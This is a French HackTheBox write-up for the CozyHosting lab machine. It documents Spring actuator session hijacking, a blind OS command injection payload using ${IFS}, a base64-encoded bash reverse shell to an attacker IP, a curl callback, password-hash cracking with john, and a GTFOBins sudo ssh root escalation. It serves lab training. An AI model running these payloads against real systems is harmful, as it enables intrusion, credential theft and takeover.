---
title:  "HacktheBox WriteUp : CozyHosting"
category: HackTheBox
tag: writeups
---
### Skills
- Nmap
- feroxbuster
- SecList
- Spring
- Session Hijacking
- Blind Os Injection
- jadx-gui
- psql (postgre)
- hashid
- password cracking

### Scanner le réseau

On fait un scan rapide sur les 1000 premiers ports.

```console
$ nmap 10.10.11.230 
PORT STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
Puis un plus détaillé sur les ports identifiés :

```console
$ nmap 10.10.11.230 -p 22,80 -sC -sV
PORT STATE SERVICE VERSION
22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http  nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On voit entre autres qu'on a une machine sous linux (Ubuntu), la version d'Openssh, etc.

On ajoute le nom de domaine du serveur web à notre /etc/hosts:
```
$ echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
```

Après exploration du site, on voit qu'il y a seulement une page de login qui est intéressante. Après tentatives de quelques couples de credentials classiques (admin/user/etc), on n'arrive pas à en tirer quelquechose.

<img src="/assets/images/WriteUps/HackTheBox/cozyHosting/loginPage.png" width="300px" height="300px" style="display: block; margin: 0 auto"/>


On revient à faire un peu d'énumération avec feroxbuster :
```console
$ feroxbuster -u "http://cozyhosting.htb/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o cozyhosting.ferox -x txt -x html
```
On voit qu'il y a quelques endpoints intéressants, notamment :
```console
401 GET 1l 1w  97c http://cozyhosting.htb/admin
204 GET 0l 0w  0c http://cozyhosting.htb/logout
500 GET 1l 1w  73c http://cozyhosting.htb/error 
```

Le endpoint d'erreur nous amène à une page "White Label Error Page" :
<img src="/assets/images/WriteUps/HackTheBox/cozyHosting/whiteLabelErrorPage.png" width="400px" height="200px" style="display: block; margin: 0 auto"/>


En recherchant sur google, on voit qu'il s'agit d'une page d'erreur utilisé avec le framework Spring.

On essaye alors de fuzzer avec une liste appropriée :
```console
└─$ ffuf -u http://cozyhosting.htb/FUZZ -w SecLists/Discovery/Web-Content/spring-boot.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: SecLists/Discovery/Web-Content/spring-boot.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

actuator/env/home       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 128ms]
actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 109ms]
actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 111ms]
actuator/env/path       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 98ms]
actuator/env/lang       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 103ms]
actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 88ms]
actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 74ms]
actuator/sessions       [Status: 200, Size: 95, Words: 1, Lines: 1, Duration: 88ms]
actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 83ms]
:: Progress: [112/112] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

### Session Hijacking
En explorant les différents endpoints, on tombe sur un endpoint intéressant : `http://cozyhosting.htb/actuator/sessions`. 

<img src="/assets/images/WriteUps/HackTheBox/cozyHosting/sessionsEndpoints.png" width="400px" height="200px" style="display: block; margin: 0 auto"/>

En y jetant un coup d'oeil, il semblerait que la valeur à gauche du nom d'utilisateur corresponde a un jeton de session

On essaye de se connecter au endpoint `/admin` découvert lors de la phase d'énumération précédente :

<img src="/assets/images/WriteUps/HackTheBox/cozyHosting/burpLoginPage.png" width="400px" height="200px" style="display: block; margin: 0 auto"/>

<img src="/assets/images/WriteUps/HackTheBox/cozyHosting/burpAdminPage.png" width="400px" height="150px" style="display: block; margin: 0 auto"/>

On arrive sur une page mais aucun lien ne semble intéressant sur la page :

<img src="/assets/images/WriteUps/HackTheBox/cozyHosting/adminConnected.png" width="800px" height="250px" style="display: block; margin: 0 auto"/>

En testant la seule fonctionnalité sur cette page, on remarque une requête `POST` qui pointe vers `/executessh`, avec 2 paramètres en POST. On essaye donc d'injecter des caractères spéciaux communs d'injection (;'<>--).
On voit que sur le paramètre `username`, une injection est possible à l'aide du caractère `;`.
Cela semble être une `"OS command injection"`.

<img src="/assets/images/WriteUps/HackTheBox/cozyHosting/executeSSH.png" width="600px" height="200px" style="display: block; margin: 0 auto"/>

Nous pouvons supposer que la commande exécutée sur le serveur ressemble à ceci : `ssh <username>@<hostname>`. 
Grâce à cela, nous pouvons créer une payload appropriée.

<u>Charge utile : 2>/dev/null;ls%20-al#</u>

- 2>/dev/null : redirige le message d'utilisation (erreur) de ssh afin que nous puissions obtenir une sortie plus propre.
- ls%20-al : juste la commande ls -al.
- \# : recommande le reste de la ligne, le nom d'hôte.

On obtient le message suivant avec burp :
```
HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 01 Nov 2023 21:47:08 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=Username can't contain whitespaces!
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
```

On remarque le message d'erreur dans le header Location : **`Location: http://cozyhosting.htb/admin?error=Username can't contain whitespaces!`**.

En cherchant un peu, on apprend qu'il est possible de faire des espaces en bash avec le caractère [`${IFS}`](https://en.wikipedia.org/wiki/Input_Field_Separators).

Ce qui remplace notre payload par `2>/dev/null;ls${IFS}-al#`.

Le message devient **http://cozyhosting.htb/admin?error=ls: invalid option -- '#'Try 'ls --help' for more information.** mais nous ne voyons pas d'ouput, ce qui présage une blind OS injection.

## Blind OS injection - Accès initial
On tente une autre approche, on va essayer de faire un curl sur un serveur http en écoute, du côté attaquant, on a notre serveur :

```console
$ python3 -m http.server 1234
```

et on transforme notre paylaod en `2>/dev/null;curl${IFS}10.10.16.23:1234/#`, pour faire un `curl 10.10.16.23:1234/` vers notre serveur http.
<img src="/assets/images/WriteUps/HackTheBox/cozyHosting/curlFromServer.png" width="400px" height="50px" style="display: block; margin: 0 auto"/>

On voit qu'on reçoit bien une requête de la part du serveur web. L'injection de commande existe belle et bien. Place à l'exploitation.

### Elaboration du payload

<u>Côté attaquant</u>
`nc -nlvp 2345`

<u>Côté victime</u>
`bash -i >& /dev/tcp/10.10.16.23/2345 0>&1`
Vu qu'il y a des caractères spéciaux, on va utiliser le base64. On l'encode :

```console
L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIzLzIzNDUgMD4mMScK
```

Côté web, on va donc utiliser echo :
```console
echo${IFS}L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIzLzIzNDUgMD4mMScK|base64${IFS}-d|/bin/bash
```

Paylaod finale :
`2>/dev/null;echo${IFS}L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIzLzIzNDUgMD4mMScK|base64${IFS}-d|/bin/bash;#`

On obtient notre shell :
```
└─$ nc -lvnp 2345
listening on [any] 2345 ...
connect to [10.10.16.23] from (UNKNOWN) [10.10.11.230] 37472
bash: cannot set terminal process group (1063): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ 
```

On voit la présence d'un fichier `.jar`
```console
$ ls -l
-rw-r--r-- 1 root root 60259688 Aug 11 00:45 cloudhosting-0.0.1.jar
```

## Enumération de serveur


Commençons par énumérer les autres utilisateurs de cette machine qui disposent d'un shell.
`cat /etc/passwd | grep /bin/bash`
```console
root:x:0:0:root:/root:/bin/bash
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
```

Actuellement, je n'ai pas les droits de lire le contenu du dossier de josh, n'étant pas josh (connecté en tant que `app`) :
`drwxr-x--- 3 josh josh 4096 Aug  8 10:19 josh`

On va donc continuer en récupérant le fichier `cloudhosting-0.0.1.jar` à l'aide d'un serveur python sur notre machine d'attaquant afin de l'analyser et chercher des credentials dedans.


On l'analyse avec `jadx-gui` 
A l'aide de l'outil de recherche, on utilise les mots clés "password" ou "josh" pour essayer de trouver quelquechose mais on n'obtient rien.
Ensuite, on se rappelle qu'il y avait un utilisateur "postgres" précedemment, mais on n'obtient rien à la simple recherche avec lui également.

En recherchant **"spring postgre credential location file"** sur google, on obtient cet [article](https://studygyaan.com/spring-boot/how-to-connect-postgresql-database-in-spring-boot-project) (partie 3), qui nous indique que les credentials sont configurés dans la partie **"application.properties"**.

On obtient le password : `Vg&nvzAQ7XxR`
<img src="/assets/images/WriteUps/HackTheBox/cozyHosting/postgreCredentials.png" width="400px" height="150px" style="display: block; margin: 0 auto"/>

## Analyse de base de données

[En cherchant sur google](https://www.prisma.io/dataguide/postgresql/connecting-to-postgresql-databases#connecting-to-a-local-database-with-psql), on regarde comme se connecter à une BDD par postgre :
```console
psql -h <hostname> -p <port> -U <username> -d <database>
```
ce qui donne :
```console
app@cozyhosting:/app$ psql -h localhost -p 5432 -U postgres -d cozyhosting
```
En utilisant la comande `\h` pour avoir des information sur la syntaxe pour executer les commandes, on explore les bases de données de la manière suivante.

D'abord on liste les bases de données.
```console
cozyhosting=# \l
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres

```


On se connecte à la base de données cozyhosting avec la commande `\c cozyhosting`, puis on énumère son contenu 
```
cozyhosting=# \d              
List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
```
On va doit regarder le contenu de la table users.

```console
cozyhosting=# SELECT * FROM users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

## Cracking de mot de passes

On récupère le hash et on le stock dans un fichier `hashes.txt`.

On utilise `hashid` pour identifier le hash.
```console
$ hashid hashes.txt 
--File 'hashes.txt'--
Analyzing '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
--End of file 'hashes.txt'--
```

Puis on identifie le numéro à donenr à hashcat pour cracker le hash (3200 ici):
```console
$ hashcat --help | grep 'Blowfish'           
3200 | bcrypt $2*$, Blowfish (Unix)                        | Operating System
```

Maintenant on fait un crackage avec hashcat :

```console
$ hashcat -O -m 3200 -a 0 hashes.txt -o cracked.txt /usr/share/wordlists/rockyou.txt
```

- -O - activer le noyau optimisé
- -m 3200 - spécifie le type de hash
- -a 0 - attaque en mode dictionnaire
- -o cracked.txt - sauvegarde le hash cracké dans un fichier

N'ayant pas assez de mémoire allouée pour ma machine virtuelle, je tente avec john :
```console
$ john --wordlist=/usr/share/wordlists/rockyou.txt.gz hashes.txt
```

On obtient le mot de passe : `manchesterunited`

## Re-Utilisation de credentials

On utilise le mot de passe précédent pour se connecter en ssh avec le comtpe de `josh`, on obtient le flag user.

## Elevation de privilège
```
josh@cozyhosting:~$ sudo -l
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

Sur [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/) on trouve une commande à executer pour devenir root : `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`.

```console
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# id
uid=0(root) gid=0(root) groups=0(root)
```
On devient root et on a donc accès au flag.



## Ref

- [feroxbuster](https://github.com/epi052/feroxbuster)
- [IFS](https://en.wikipedia.org/wiki/Input_Field_Separators)
- [Postgres on Spring](https://studygyaan.com/spring-boot/how-to-connect-postgresql-database-in-spring-boot-project)
- [Connection par postgre](https://www.prisma.io/dataguide/postgresql/connecting-to-postgresql-databases#connecting-to-a-local-database-with-psql)
- [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/)